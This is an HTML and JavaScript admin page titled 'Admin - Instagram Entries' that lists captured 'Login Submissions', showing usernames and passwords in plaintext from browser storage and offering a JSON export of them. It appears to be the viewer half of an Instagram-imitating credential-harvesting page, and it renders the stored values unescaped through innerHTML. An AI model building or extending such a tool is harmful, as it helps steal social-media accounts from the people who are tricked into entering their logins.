<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Instagram Entries</title>
    <link rel="stylesheet" href="./styles.css">
    <style>
        .admin-container { max-width: 900px; margin: 40px auto; padding: 0 16px; }
        .admin-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .admin-actions { display: flex; gap: 8px; }
        .table { width: 100%; border-collapse: collapse; background: #fff; border: 1px solid var(--border); }
        .table th, .table td { padding: 10px 12px; border-bottom: 1px solid var(--border); font-size: 14px; text-align: left; }
        .table th { background: #fafafa; font-weight: 600; color: #6b6b6b; }
        .empty { color: var(--subdued); text-align: center; padding: 24px; }
        .muted { color: var(--subdued); font-size: 12px; }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="admin-header">
            <h2>Login Submissions</h2>
            <div class="admin-actions">
                <button id="export" class="btn">Export JSON</button>
                <button id="clear" class="btn" style="background:#efefef">Clear All</button>
                <a href="./index.html" class="btn" style="background:#efefef;text-decoration:none">Back</a>
            </div>
        </div>
        <p class="muted">Usernames and passwords are stored locally in your browser. Handle with care.</p>

        <table class="table" id="entries-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Created</th>
                </tr>
            </thead>
            <tbody id="tbody">
                <tr><td colspan="4" class="empty">No entries yet</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        (function(){
            function read() {
                try {
                    const raw = localStorage.getItem("ig_login_entries_v1");
                    return raw ? JSON.parse(raw) : [];
                } catch { return []; }
            }
            function write(entries){ localStorage.setItem("ig_login_entries_v1", JSON.stringify(entries)); }

            function render(){
                const entries = read();
                const tbody = document.getElementById('tbody');
                tbody.innerHTML = '';
                if(!entries.length){
                    tbody.innerHTML = '<tr><td colspan="4" class="empty">No entries yet</td></tr>';
                    return;
                }
                entries.forEach((e, i) => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = `<td>${i+1}</td><td>${e.username || ''}</td><td>${e.password || ''}</td><td>${new Date(e.createdAt).toLocaleString()}</td>`;
                    tbody.appendChild(tr);
                });
            }

            document.getElementById('export').addEventListener('click', () => {
                const data = read();
                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'entries.json';
                a.click();
                URL.revokeObjectURL(url);
            });

            document.getElementById('clear').addEventListener('click', () => {
                if(confirm('Clear all entries?')){
                    write([]);
                    render();
                }
            });

            render();
        })();
    </script>
</body>
</html>


